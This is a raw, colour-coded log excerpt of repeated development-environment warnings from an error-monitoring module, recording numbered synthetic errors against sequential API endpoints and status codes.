WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.904028Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4018'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m418[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.904077Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4019'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m419[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.904126Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4020'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m420[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.904173Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4021'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m421[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.904221Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4022'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m422[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.904269Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4023'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m423[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.904316Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4024'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m424[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.904364Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4025'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m425[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.904414Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4026'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m426[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.904461Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4027'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m427[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.904509Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4028'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m428[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.904556Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4029'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m429[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.904603Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4030'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m430[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.904650Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4031'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m431[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.904699Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4032'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m432[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.904746Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4033'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m433[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.904794Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4034'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m434[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.904841Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4035'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m435[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.904888Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4036'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m436[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.904938Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4037'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m437[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.904985Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4038'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m438[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.905033Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4039'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m439[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.905080Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4040'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m440[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.905127Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4041'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m441[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.905173Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4042'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m442[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.905221Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4043'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m443[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.905268Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4044'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m444[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.905315Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4045'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m445[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.905362Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4046'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m446[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.905409Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4047'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m447[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.905457Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4048'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m448[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.905521Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m81[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4049'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m449[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.905613Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4050'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m450[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.905675Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4051'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m451[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.905731Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4052'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m452[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.905784Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4053'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m453[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.905834Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4054'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m454[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.905892Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4055'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m455[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.905942Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4056'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m456[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.905991Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m82[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4057'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m457[0m
